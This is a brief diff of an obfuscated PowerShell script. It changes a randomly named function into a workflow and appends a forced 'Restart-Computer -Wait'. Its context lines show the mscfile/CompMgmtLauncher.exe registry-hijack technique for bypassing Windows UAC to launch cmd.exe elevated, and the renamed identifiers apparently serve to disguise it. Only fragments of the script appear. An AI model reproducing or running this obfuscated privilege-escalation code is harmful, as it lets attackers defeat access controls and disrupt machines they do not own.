@@ -1,4 +1,4 @@
-function gXJqIeQLEx{
+workflow gXJqIeQLEx{
 	[CmdletBinding()]
 	param([string]$nGZbQUSuHF='cmd.exe')
 
@@ -39,5 +39,6 @@ function gXJqIeQLEx{
 			snCAvSgLOW mscfile CompMgmtLauncher.exe $nGZbQUSuHF
 		}
 	}
+	Restart-Computer -Wait
 }
 gXJqIeQLEx 'cmd.exe'
